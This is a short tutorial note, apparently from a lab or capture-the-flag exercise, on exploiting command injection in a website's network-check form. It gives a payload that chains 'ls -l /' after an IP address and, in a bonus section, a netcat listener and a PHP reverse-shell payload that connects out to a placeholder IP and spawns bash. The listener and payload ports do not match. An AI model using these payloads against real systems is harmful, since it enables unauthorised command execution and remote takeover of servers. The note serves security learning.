## **Overview**

Command injection isÂ **an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application**.


## **General Exploitation**

- Given a website with a **network check**

- Anytime we input an **IP Address** or a domain name we can see it checks it up and even tells us the `curl` request been made

- We could use special operators like `| && || ;` to perform command execution after the given **IP/domain name**, right here i will be using this query

```
127.0.0.1 ; ls -l / #
```


> **Note :** the `#` symbol at the end of this query comments out the `| grep "HTTP/"` thereby not making it to execute

### **Bonus**

We can also attempt to get a reverse shell

- On your terminal do 

```bash
$ nc -lvnp 444
```

- Navigate to the website and use payload :

```PHP
; php -r '$sock=fsockopen("IP_ADDRESS",4444);exec("/bin/bash <&3 >&3 2>&3");' #
```
